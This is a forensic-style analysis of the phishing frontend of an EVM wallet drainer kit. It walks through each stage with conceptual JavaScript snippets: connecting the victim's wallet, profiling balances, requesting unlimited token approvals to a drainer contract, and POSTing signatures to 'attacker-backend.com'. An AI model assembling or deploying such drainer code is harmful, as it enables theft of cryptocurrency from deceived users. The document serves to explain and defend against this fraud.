# EVM Drainer Kit: Phishing Frontend Code Flow Analysis

**Source Document:** Comprehensive EVM Drainer Forensic Report
**Date of Analysis:** May 12, 2025

## 1. Introduction

This document details the conceptual code execution flow of the **Phishing Frontend** component of a typical EVM wallet drainer kit, as derived from the analysis presented in the "Comprehensive EVM Drainer Forensic Report." The frontend is the primary user-facing element, designed to lure victims and initiate the draining process by tricking them into connecting their wallets and approving malicious transactions or signing messages.

## 2. Core Objectives of the Phishing Frontend Code

Based on the forensic report, the frontend code aims to:

1.  **Present a Deceptive Interface:** Mimic legitimate dApps, airdrop pages, NFT minting sites, or other crypto-related services to gain user trust.
2.  **Induce Wallet Connection:** Prompt the user to connect their cryptocurrency wallet (e.g., MetaMask, Trust Wallet).
3.  **Gather Victim Information:** Once connected, attempt to gather basic wallet information (address, network, sometimes balances) to tailor subsequent malicious actions.
4.  **Initiate Malicious Requests:** Craft and present deceptive prompts for users to sign transactions (e.g., token approvals, NFT `setApprovalForAll`) or off-chain messages (e.g., EIP-712 signatures for Permit, Seaport orders).
5.  **Communicate with Backend:** Send victim data, signed messages, or transaction statuses to the backend C2 server for processing and execution of the actual draining.

## 3. Conceptual Code Execution Flow (JavaScript-centric)

The forensic report suggests the following conceptual flow, typically implemented in JavaScript (e.g., using frameworks like React/Vue or plain JS, often heavily obfuscated):

### 3.1. Page Initialization and Lure Presentation (`index.html`, `app.js`, `ui.js`)

*   **Execution Step 1: Load Deceptive UI.**
    *   **Logic:** The browser loads `index.html`. Associated JavaScript files (`app.js`, `ui.js`, or similar, as per the report's component breakdown) execute.
    *   **Code Concept (Report Implication):** Standard HTML, CSS, and JavaScript render the phishing page. This might involve dynamically fetching content (e.g., project names, logos from a configuration file or backend) to customize the lure.
    *   **Functionality:** Display a convincing replica of a known service or an enticing offer (e.g., "Claim Free Tokens," "Exclusive NFT Mint").
    *   **Data Flow:** No significant data flow outwards at this stage, primarily focused on presentation.

### 3.2. Wallet Connection (`wallet.js`, `web3-provider-handler.js`)

*   **Execution Step 2: User Clicks "Connect Wallet" Button.**
    *   **Logic:** An event listener attached to a "Connect Wallet" button triggers a JavaScript function.
    *   **Code Concept (Report Implication):**
        ```javascript
        // Conceptual snippet based on report's description of Web3 interaction
        async function connectWallet() {
            if (window.ethereum) {
                try {
                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                    // Store account, update UI, potentially send to backend
                    handleAccountConnected(accounts[0]);
                } catch (error) {
                    console.error("User denied account access or error occurred", error);
                    // Display error to user
                }
            } else {
                // Wallet provider not found
                alert("Please install a Web3 wallet like MetaMask!");
            }
        }
        // document.getElementById('connectButton').addEventListener('click', connectWallet);
        ```
    *   **Functionality:** Uses a Web3 library (ethers.js, web3.js, or direct provider requests as implied by the report) to interact with the browser's wallet extension.
    *   **Data Flow:** User's wallet address is obtained. This address is often displayed on the UI and may be sent to the backend immediately for logging/tracking purposes.
    *   **Report Reference:** The "Phishing Frontend" and "Web3 Interaction Layer" sections of the forensic report describe this process.

### 3.3. Information Gathering (Optional, `drainer.js`, `victim-profiler.js`)

*   **Execution Step 3: (Optional) Fetching Wallet Details.**
    *   **Logic:** After successful connection, some drainers, as per the report, attempt to fetch more details about the victim's wallet.
    *   **Code Concept (Report Implication):**
        ```javascript
        // Conceptual snippet
        async function getWalletDetails(address) {
            // const balance = await provider.getBalance(address); // ETH balance
            // const tokenBalances = await fetchTokenBalances(address); // ERC20 balances
            // const nftHoldings = await fetchNftHoldings(address); // NFT holdings
            // sendVictimProfileToBackend({ address, balance, tokens: tokenBalances, nfts: nftHoldings });
        }
        ```
    *   **Functionality:** Queries the blockchain (via the connected wallet provider) for ETH balance, token balances (for a predefined list of common tokens), and NFT holdings.
    *   **Data Flow:** Wallet address, balances, and potentially NFT information are collected and often sent to the backend. This helps the backend decide which drainer smart contract or method to employ.
    *   **Report Reference:** The report mentions backend logic often tailors the attack based on victim assets.

### 3.4. Crafting and Presenting Malicious Requests (`drainer.js`, `approval-handler.js`)

*   **Execution Step 4: User Interacts with a Malicious Action Button (e.g., "Claim," "Mint," "Approve Spend").**
    *   **Logic:** An event listener on a deceptive action button triggers a function designed to request a malicious signature or transaction approval.
    *   **Functionality:** The frontend code, often guided by instructions or configurations received from the backend (as suggested by the report's description of C2 interaction), determines the type of malicious request:
        *   **ERC20 Approvals:** Request approval for a large amount (e.g., `MAX_UINT256`) of a specific token to be spent by the attacker's drainer contract.
        *   **NFT Approvals:** Request `setApprovalForAll` for one or more NFT contracts, giving the drainer contract control over all victim's NFTs from that collection.
        *   **Permit/EIP-712 Signatures:** Request an off-chain signature for EIP-2612 (Permit for ERC20s) or EIP-712 typed data (e.g., for Seaport marketplace orders, as highlighted in advanced drainer analyses in the report).
        *   **`eth_sign`:** For more direct control or to exploit vulnerabilities, though less common for simple drains due to strong wallet warnings.
    *   **Code Concept (Report Implication for ERC20 Approval):**
        ```javascript
        // Conceptual snippet for requesting token approval
        async function requestTokenApproval(tokenAddress, spenderAddress, amount) {
            // const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, signer);
            // try {
            //    const tx = await tokenContract.approve(spenderAddress, amount);
            //    await tx.wait();
            //    // Notify backend of successful approval
            //    sendApprovalStatusToBackend({ token: tokenAddress, spender: spenderAddress, status: 'success', txHash: tx.hash });
            // } catch (error) {
            //    console.error("Approval failed or rejected", error);
            //    // Notify backend of failure
            //    sendApprovalStatusToBackend({ token: tokenAddress, spender: spenderAddress, status: 'failed' });
            // }
        }
        // document.getElementById('claimButton').addEventListener('click', () => {
        //    requestTokenApproval(TARGET_TOKEN_ADDRESS, DRAINER_CONTRACT_ADDRESS, MAX_UINT256);
        // });
        ```
    *   **Data Flow:** Transaction parameters (token address, spender address, amount) are used. The user is prompted by their wallet to sign/approve. The result (transaction hash if on-chain, signature if off-chain) is captured.
    *   **Report Reference:** Detailed in "Victim's Wallet Interaction & Exploitation" and component breakdowns for frontend and Web3 layer.

### 3.5. Sending Data to Backend (`drainer.js`, `api-client.js`)

*   **Execution Step 5: Transmitting Captured Data to Backend.**
    *   **Logic:** After the user signs a transaction or message, the frontend code captures the result (e.g., transaction hash for an approval, or the signature itself for an off-chain message).
    *   **Code Concept (Report Implication):**
        ```javascript
        // Conceptual snippet
        async function sendDataToBackend(payload) {
            // try {
            //    const response = await fetch('https://attacker-backend.com/api/submit_data', {
            //        method: 'POST',
            //        headers: { 'Content-Type': 'application/json' },
            //        body: JSON.stringify(payload)
            //    });
            //    // const result = await response.json();
            //    // Handle backend response (e.g., display success/failure message to victim)
            // } catch (error) {
            //    console.error("Error sending data to backend", error);
            // }
        }
        // Example payload: { victimAddress: '0x...', signature: '0x...', type: 'permit', token: '0x...' }
        // Example payload: { victimAddress: '0x...', txHash: '0x...', type: 'approval', token: '0x...' }
        ```
    *   **Functionality:** Makes an HTTP request (e.g., POST) to an API endpoint on the attacker's backend server.
    *   **Data Flow:** Sends critical data like the victim's address, the signed message, transaction hash, type of interaction (approval, permit, etc.), and targeted asset details to the backend.
    *   **Report Reference:** The interaction between frontend and backend is a core part of the architecture described in the report.

### 3.6. Handling Backend Responses and UI Updates (`drainer.js`, `ui.js`)

*   **Execution Step 6: (Optional) Displaying Further Instructions or Fake Status.**
    *   **Logic:** The frontend may receive a response from the backend.
    *   **Functionality:** Based on the backend's response or predefined logic, the UI might be updated to show a fake success message ("Tokens Claimed!"), a fake error ("Try again later"), or redirect the user to a legitimate site to reduce suspicion, as noted in the report's behavioral analysis.
    *   **Code Concept (Report Implication):** Simple DOM manipulation to change text or visibility of elements.
    *   **Data Flow:** Receives status/instructions from the backend.

## 4. Obfuscation

The forensic report heavily emphasizes that frontend JavaScript code in drainer kits is almost always heavily obfuscated to hinder analysis. Techniques mentioned include variable renaming, string encoding, control flow flattening, and packing. This means the actual code would look very different from the conceptual snippets above, but the underlying logic aims to achieve these steps.

## 5. Conclusion

The Phishing Frontend's code is engineered to be a deceptive and interactive lure. Its execution flow revolves around gaining the victim's trust, tricking them into connecting their wallet, and then manipulating them into signing malicious approvals or messages. The captured information is then relayed to the backend, which orchestrates the actual draining of assets. The effectiveness of this component relies on social engineering and the victim's lack of scrutiny when interacting with Web3 prompts.

